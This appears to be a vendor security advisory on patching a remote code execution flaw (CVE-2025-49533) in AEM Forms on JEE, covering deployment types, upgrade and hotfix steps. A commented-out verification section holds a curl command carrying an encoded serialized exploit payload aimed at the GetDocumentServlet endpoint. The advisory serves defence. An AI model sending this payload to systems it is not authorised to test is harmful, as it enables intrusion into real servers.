# Mitigating Remote Code Execution Vulnerability for AEM Forms on JEE (CVE-2025-49533) 

This document provides guidance on addressing a critical security concern (CVE-2025-49533) in AEM Forms on JEE that could potentially allow unauthorized code execution through an unsecured servlet. 

## Understanding AEM Forms Deployment Types

This vulnerability affects different AEM Forms deployments differently. Understanding your deployment type is crucial for determining the appropriate mitigation steps.

### Affected version

* All AEM Forms on JEE versions from 6.0 through 6.5 are affected by this vulnerability. Only AEM Forms 6.5 and its service packs are currently maintained and supported. All other versions (6.0-6.4) have reached end-of-life (EOL).

### Fix Versions 

* AEM 6.5 Forms Service Pack 23 with hotfix provided to fix the vulnerability. 

### Co-deployed vs. Standalone AEM Forms on JEE Deployments

**Co-deployed (AEM Forms + CQ EAR):**

* Both AEM Forms JEE and AEM (CQ) author and publish Enterprise Application Archive (EAR) are deployed together on the same application server
* Provides unified environment with both Forms capabilities and AEM content management

**AEM Forms on JEE Standalone:**

* AEM Forms is deployed on the application server with only JEE components, and without any AEM EAR.
* Limited to JEE-specific features and functionality of AEM Forms

### How to Identify Your Deployment Type

To definitively determine the deployment type, check what artifacts are actually deployed on the application server. Typically, but not limited to, via the server's Administration Console.

**Co-deployed indicators:**

* The `/lc` endpoint is accessible on your server (e.g., `https://your-server/lc`)
* You can access AEM author/publish endpoints. 
* URL structure includes AEM paths like `/content/`, `/apps/`, `/etc/`
* AEM content management features are available alongside Forms

**Standalone indicators:**

* Only Admin UI interfaces are accessible
* No AEM author/publish functionality
* Limited to Forms JEE-specific URLs and interfaces


## Affected Versions

| Product | Versions Requiring Mitigation | Versions Eligible for Hotfix |
|---------|-----------------------------|-----------------------------|
| Adobe Experience Manager 6.5 Forms on JEE | All Adobe Experience Manager 6.5 Forms on JEE standalone installations| AEM 6.5 Service Pack 18 through Service Pack 23 |

## Resolution

### Version-Specific Solutions

| AEM Forms Version | Required Action |
|---|---|
| AEM 6.5 Forms Service Pack 18 - Service Pack 22 with AEM author or publish EAR co-deployed|  [Upgrade to AEM 6.5 Service Pack 23 or later](/help/release-notes/release-notes.md)  |
| AEM 6.5 Forms Service Pack 18 - Service Pack 23 without AEM author or publish EAR co-deployed (For standalone AEM Forms on JEE deployment)| [Apply hotfix](#apply-the-hotfix) |
| AEM 6.5 Forms Service Pack 17 and earlier | 1.  [Upgrade to AEM 6.5 Service Pack 23 or later](/help/release-notes/release-notes.md) <br> 2. For standalone AEM Forms on JEE deployments, [apply the hotfix](#apply-the-hotfix). |

> **Note**: AEM Forms officially supports only the six most recent service packs. Users on older versions should first upgrade to the latest service pack and then implement the required security measures.

## Deployment Considerations

### For Clustered Environments

When working with a clustered deployment:

* Apply hotfix installation on **all nodes** in the cluster
* Maintain consistency by using identical hotfix versions across all servers
* Complete updates on all nodes before initiating any service restarts
* Verify the fix on each node independently using the verification steps

### For Single Node Environments

When working with a AEM Fomrs on JEE standalone deployment:

* Follow a simplified process as there are no additional nodes to manage
* Complete all hotfix installation steps as instructed

<!-- ## Vulnerability Verification

Before implementing the fix, verify if your system is vulnerable by executing the following tests:

### Test Commands

#### 1. Test with Exploitable Payload
```bash
curl -o /dev/null -s -w "Total time: %{time_total}\n" https://${FORMS_HOST}/FormServer/GetDocumentServlet?serDoc=H4sIAAAAAAAAAK1WTWxbRRCetR3bsZI2P80fhf4HkpS%2Bl5C2aXFEyA9tXV5IUEw4%2BGCtnxfnlffX3X3E6YEDElKvCC4ckRAcKIdISFQckLhy5gRCQkLigAQcygGp4md2nxOnIWqSNpH8dndmd76Zb2dmc%2Bc3aBEc%2Bm7Qt6gRScc1FrkTcEeuvRqxiH3w%2FegX96feWU9CogAp4dxiFuTswAsppzLgEnotddJUJ83ZTXm%2BHgJAAg2fDXjNoCG1V5iB57zAF0aFUV8dEMYMzpqnfv7o9q%2Fi1MfXEpB4AOUmvA3EgmzIg5BxuSahK0Z1qV8zlyR3%2FBoiItrUDmh24LrMlk4837ApjAZuxWVND%2B7%2F%2BeHgXX99IgFQDyV0BJEMI7kY4zpMrKYwrCQCPY%2BWDBH5xhbAOkV%2FDMeXjPvUNerClbYhOa0bReaFLpVMFHBsfX3hG%2F%2FOZ%2BNJSBegvez4VebLVyKvwngBDpXxgC9cJgsor5cgV66sSWYHVSYkJEulmRKky7ZLBS67SltomFWyvAUtZZ96TFGWsqCzvD2CB2%2BsKY9vDP7Fv4hroJf%2FHuip1X6IuVC3ifJEaebOvb6%2F0tniTw1x%2BtK3%2F3z1Naqfg%2FEMjBEYXxOBYNyhrhnSNTegVRFjXaXVGpPizJKMKsVGkIvxjgykCLyIlJpIqYmUmjGlpqbU3KDU1JSaPPKl4zFzuiKQLFtuGMtAmsARHZwTmEvaB%2BeWumACHbFLy4wLTITXCnMEyHUC7bOYFZL6cpm6EWv5%2FMT799778Y8XCKQnHd%2BROEkODS8TSM3iBeQgCR1t0AbtBA5bjs%2FiSyvGCF1WYCMARRhcN4QpueIIAhesRyAlT6BVJ8MbAfcI8CFrrwTNLcznSzvu9tzmXtEgiPEmV6pKrlG%2F6jKeV3HnXqrbLNS1k4EBApf36sJGLJvnCWSrgR15mOsEzu0rFDy6EvuEVM48fmAEPtkfl7siVqVnzhXnp%2BuOKKBId8AD4T%2FrNMypHHoULwhkGtwRmD4A5nJLQcRtdsVR2d3WyF5D1RwuC77PuO5DDNPlGQLHd0l7At07JD6GPWm7jfrraHa44gpnqleMEHyyXMZCrK%2Bh68PLbfAsnMvBWTCwoJcktd%2Bcp2GjAJ9serC4it6NTYxdnLh8cfzC%2BbFRbFbHrIfp83ASsAPgrwV%2FT0AGsji2ql4IOUjhHHsBfg%2BhxMSR4Ngy8iUcXtdbOvGb1kITuvDbFm%2BAbuyVgPMe6MVdfThXpvq1mSn1vijtdhPntYkTsbJhArRXR7UeQ4Wn8IQye%2Bx%2FZgt6tYPZS9rsSKzc0exxBE3o2Uk4hfBZGN4MWq2Vrv1TSBKrs%2Fv2u3fBXNebR3UgROlPa8wzMIhjTtP0NAxBa6TeqA7c%2B93mC3I0AwkCp3drlleCQL8YW3JjoXID3%2FjHfwFu%2FuL8Puld7T%2FoF2Bw1xcAg9pffQ3spb6SaPahWUz2nsWT27L4iNb36G%2BvTrjYXD%2BCtOJ%2FTymsKB6uEqirm26v%2FwfLba%2FhawoAAA%3D%3D

#### 2. Test with Non-Exploitable Payload
```bash
curl -o /dev/null -s -w "Total time: %{time_total}\n" https://${FORMS_HOST}/FormServer/GetDocumentServlet?serDoc=1234
```

**Note**: Replace `${FORMS_HOST}` with your actual Forms server hostname and port.

### Vulnerability Confirmation
* **Vulnerable System**: Response time ≥ 5 seconds for exploitable payload
* **Secure System**: Response time ~600ms for both payloads
* **Indicator**: Significant difference in response times confirms the vulnerability -->

## Mitigation Steps

### For Servers with CQ EAR co-deployed

* Check if AEM EAR is co-deployed within your JEE instance
* If AEM author or publish EAR co-deployed, [upgrade to AEM 6.5 Service Pack 23 or later](/help/release-notes/release-notes.md)

### For Servers without CQ EAR co-deployed (AEM Forms on JEE Standalone)

#### Verify AEM Forms version

1. Ensure you have administrative access to AEM Workbench.
1. [Ensure your AEM Forms version](https://experienceleaguecommunities.adobe.com/t5/adobe-experience-manager/how-find-the-aem-forms-version-using-the-aem-admin-or-system/m-p/603733) is AEM 6.5 Forms Service Pack 18  through Service Pack 23.

#### Apply the hotfix

1. **Download the hotfix:**
   * Access Adobe Software Distribution to download the hotfix
   * Save the hotfix file to your local machine
   * Verify the integrity of the downloaded file

2. **Install the hotfix:**
   * Open **AEM Workbench**
   * Connect to the impacted AEM Forms server
   * Navigate to **Window → Show View → Components**
   * Right-click in the Components view and select "Install Component"
   * Browse and select the hotfix file
   * Follow the installation wizard prompts and wait for completion

3. **Wait and validate:**
   * Wait for all services to fully initialize

#### Troubleshooting

**Common Issues:**

* Verify all AEM Forms services have started correctly 
* Check application server logs for any installation errors
